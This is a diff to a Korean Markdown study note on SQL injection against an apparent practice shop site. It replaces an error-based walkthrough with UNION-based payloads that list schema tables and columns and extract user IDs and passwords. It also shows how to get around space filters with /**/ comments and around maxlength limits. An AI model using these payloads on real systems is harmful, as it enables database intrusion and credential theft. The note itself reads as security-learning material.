@@ -63,10 +63,12 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 
 데이터베이스에서 제공하는 **information.schema**를 통해 테이블 명을 확인한다.
 
+* 이 내용은 맨 밑에서 다루겠습니다 ! 궁금하신분은 맽 밑으로 !!
+
 해당 주소 찾기의 데이터베이스의 칼럼은 총 5개 인 것을 확인했으므로, 앞으로의 `UNION`은 5개로 한정하여 검색한다.
 
 ```SQL
-' UNION SELECT 1, 2, 3, 4 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
+&#39; UNION SELECT 1, 2, 3, 4 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
 ```
 <p align="center">
 <img src ="https://user-images.githubusercontent.com/78135526/178675478-002543bc-db45-402a-96d3-89a287489e82.png" width = 350>
@@ -81,7 +83,7 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 ### 4. Union으로 칼럼 명 확인
 
 ```SQL
-' UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
+&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
 ```
 <p align="center">
 <img src ="https://user-images.githubusercontent.com/78135526/178677782-b75535bd-c524-40e6-a5b3-50513a711aa0.png" width = 350>
@@ -91,148 +93,62 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 
 * user_id, passwd 등 개인 정보를 쉽게 가져 올 수 있다는 것을 알 수 있다.
 
-
-
-위 그림과 같이 SQL의 기본 구문은 아래와 같다.
-```SQL
-SELECT * FROM TABLE_NAME WHERE 조건 = ''
-```
-
-하지만, `'(싱글 쿼테이션)`을 하나 더 추가하게 된다면 `() {} [] `처럼 짝을 이루지 않았을 때 에러가 발생하게 된다. 
-
-이러한 에러를 발생시켜서 정보를 수집하는 것이다.
-
-### 1. Database 정보 확인
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178286249-02b0b9bd-5687-4342-897c-f65417ea9030.png">
-</p>
-
-위에서 예시로 Quick Search 부분에 **'(싱글 쿼테이션)**를 하나 넣으면 아래와 같은 에러와 함께 Microsoft OLE DB Provider for SQL Server가 나오게 된다.
-
-* **즉, 해당 환경은 MSSQL을 사용하고 있다는 것을 알 수 있다.**
-
-또한 Quick Search에 대한 SQL 작동은 `shop_searchresult.asp`를 통해서 전달 되는 것을 알 수 있다.
-
-### 2. DateBase 이름 확인
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178288703-cc39bcf4-db8a-46e9-bb13-2639a6ec9b3f.png">
-</p>
-
-`db_name()`는 해당 함수는 SQL에서 기본 제공 해주는 함수이다.
-
-이 함수는 Return 값으로 현재 Database의 이름을 반환한다. 
-
-<a href = "https://docs.microsoft.com/ko-kr/sql/t-sql/functions/db-name-transact-sql?view=sql-server-ver16"> 자세한 내용은 해당 링크를 참조하시면 됩니다.</a>
-
-반환 형식은 **nvarchar(128)**로 명시 되어 있는데 즉, 
-함수를 이용해서 `' and db_name() > 1 --`를 하게 된다면,
+* 하지만, 너무 많은 것을 가져 오기 때문에, `WHERE` 조건을 이용하여 원하는 정보만 추출해야한다.
 
 ```SQL
-SELECT * FROM TABLE WHERE ITEM = ''`를 `SELECT * FROM TABLE WHERE ITEM = '' AND db_name() > 1 -- '
+&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MEMBERS' --
 ```
 
-이렇게 변하게 된다.
+### 5. 주요 정보 추출
 
-* db_name()의 Return은 varchar이지만 비교 대상의 '1'은 int형이기에 에러가 발생한다.
+이로써, 주요 정보가 담긴 테이블 및 칼럼의 이름을 확인했다. 
 
-* **결과로 해당 Datebase의 이름은 'oyesmall'인 것을 알 수 있다.**
-
-### 3. Having 구절로 테이블, 칼럼 확인
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178291719-15b6f64e-fe33-43ec-8cd8-75319382577e.png" width = 320>
-</p>
-
-SQL에서 그룹별 집계된 결과 중 원하는 조건의 결과만 필터링 해주는 `HAVING`절이 존재한다.
-
-그룹별이라면 `Group by`와 같이 사용 해야한다는 것인데 `having`을 단독으로 사용했을 때에 에러를 이용 하는 것이다.
-
-* `having`에 대한 조건은 `1=1`로 항상 참이 되게 하고 이후 내용을 모두 `--`로 주석 처리한다면 비밀번호에 어떤 문자가 와도 주석이 되는 것을 참고하세요.
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178293904-23d53ef4-4b4c-452b-9611-7ab12f1d3edf.png" width = 480>
-</p>
-
-* 해당 결과로는 Members 테이블에 num이라는 컬럼이 존재하는 것을 알 수 있다.
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178294912-52aaf9fa-a752-47c4-a12e-d8b0789aa619.png" width = 480>
-</p>
-
-첫번째 칼럼의 이름을 알았으므로 group by를 이용해 `' group by Members.num having 1=1 --`를 하면 두번째 칼럼을 알 수 있다.
-
-이렇게 두번째 칼럼의 이름까지 `' group by Members.num, Members.user_id having 1=1 --`로 세번째도 알 수 있다.
-
-### 4. IN, NOT IN을 통한 칼럼 내용 확인
-
-Having 구절로 테이블, 칼럼의 이름을 알아냈다.
-
-칼럼의 이름을 알아 낸 것으로 그치면 아무 쓸모가 없기에, 해당 칼럼의 값이 무엇인지 확인 해본다.
-
-Having 구절로 테이블명은 **Members**, 칼럼은 **num, user_id, passwd** 등이 있는 것을 알았다.
-
-<p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178434665-1951d930-c6c5-41c7-9ff1-be1a30506d99.png" width = 320>
-</p>
-
-기본 형태로는 아래와 같다.
- ```SQL
- SELECT COLUMN FROM TABLE WHERE ITEM = ''
- ```
+해당 테이블명과 칼럼명을 활용해 `UNION SELECT`를 해본다.
 
 ```SQL
-' OR 1 IN(SELECT USER_ID FROM MEMBERS WHERE USER_ID >= 'a') --
+&#39; UNION SELECT 1, 2, 3, USER_ID, PASSWD FROM MEMBERS --
 ```
-
-우리가 알아낸 테이블명 **Members**, 칼럼명 **USER_ID**을 대입하여 완성한다.
-
-해당 구문에서 Error가 발생하는 이유로는 `IN`은 WHERE구문에서 내부 Query를 진행 하는데 `IN` 내부에서 진행한 쿼리와 `OR 1`에 대한 데이터 형식이 **INT**, **nvarchar**로 다르기에 에러가 발생하면서 해당 값을 보여주게 된다.
 
 <p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178436961-33a53c45-ce25-4b1d-a54b-e8517ef436cf.png" width = 480>
+<img src ="https://user-images.githubusercontent.com/78135526/178680967-3905dc73-ec03-4faf-8991-6dbbd3d77959.png" width = 350>
 </p>
 
-가장 첫번째로 나온 값으로는 **'oyes'** 라는 칼럼의 값을 뽑아냈다.
+### 6. 보안 대책 우회
 
-이후로는 `NOT IN`을 이용하여 뽑아볼 수 있다. 결과는 **'oyes'**의 이후 값을 뽑아 내기에 명령어만 보여줄 것이다.
+UNION 구문을 사용하다보면 글자 수가 비정상적으로 길어진다.
 
-```SQL
-'OR 1 IN(SELECT USER_ID FROM MEMBERS WHERE USER_ID NOT IN (‘oyes’,‘,,,,,’)) -- 
-```
-
-NOT IN에 나온 값을 하나씩 대입하면 해당 값을 제외한 칼럼의 값을 뽑을 수 있다.
-
-### 5. DB Table의 행(튜플)의 개수
-
-각 DB에는 몇 개의 데이터가 있을 지 확인 해볼 것이다.
-
-이번에 이용해볼 함수로는 `CAST()`함수다.
-
-이 함수는 테이블에서 추출한 값을 명시적으로 형변환 하는 것이다.
-
-예를 들면 
-```SQL
-SELECT 3 + 'age' --> Error 발생
-```
-
-* 형변환 에러를 해결하기 위해 사용하지만, 우리는 이러한 Error를 유발하여 테이블의 행 개수를 알아 낼 것이다.
-
-```SQL
-'OR 1 IN(SELECT 'a' + CAST(COUNT(*) AS VARCHAR(100)) FROM MEMBERS) --
-```
-
-MEMBERS 테이블에서 모든 것을 COUNT 하여 VARCHAR(100)로 형변환 한 후, 해당 값에 'a'를 더하여 `OR 1`을 하기에 INT와 VARCHAR로 데이터 형식이 맞지 않아 Error를 유발한다. 
+이러한 것을 막기 위해 JavaScript로 제한 하는 경우가 있다.
 
 <p align="center">
-<img src ="https://user-images.githubusercontent.com/78135526/178441663-b75e4a43-ba0e-4b53-bd3f-e218252c435d.png" width = 480>
+<img src ="https://user-images.githubusercontent.com/78135526/178681334-d66d16f3-c54a-4c5d-bfb7-e54836067ee4.png" width = 350>
 </p>
 
-* 이처럼 해당 테이블에는 총 9개의 행이 존재한다는 것을 알 수 있다.
+이처럼 **maxlength**로 명시 되어 있다.
 
-## 보안 대책
+그냥 개발자 도구로 **maxlength**를 지우면 가능하지만, 실제로 이렇게 우회 되는 경우는 없을 것이다.
 
-* 서버 입장에서는 에러에 대한 메세지를 직접적으로 노출 시키면 안된다.
+아니면 띄워쓰기를 필터링하여 비정상적인 쿼리를 막는 경우가 있다.
 
-* 이러한 에러 노출로 인해 관리자의 ID, PW 및 이용자의 모든 정보를 확인 가능 하기 때문이다.
+이 방법도 우회가 가능하다.
+
+```SQL
+&#39;/**/UNION/**/SELECT/**/1,2,3,USER_ID,PASSWD/**/FROM/**/MEMBERS/**/--
+```
+
+* 주석을 활용한 방법이 대표적인 예시이다.
+
+## INFORMATION.SCHEMA
+
+INFORMATION.SCHEMA란 SQL서버 내에 존재하는 DB의 메타 정보 **(테이블, 칼럼, 인덱스 등의 스키마 정보)**를 모아둔 것이다. INFORMATION.SCHEMA 내의 모든 테이블은 읽기 전용이며, 단순한 조회만 가능하다는 것이다.
+
+* INFORMATION.SCHEMA는 직접 생성하지 않아도 생성된다. 궁금하신분은 SQL 명령어를 통해 아래 처럼 볼 수 있습니다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/178683269-26e412a6-d68d-4ddc-9bd5-adf370dceb71.png" width = 350>
+</p>
+
+```SQL
+SHOW DATABASES;
+
+SHOW TABLES;
+```
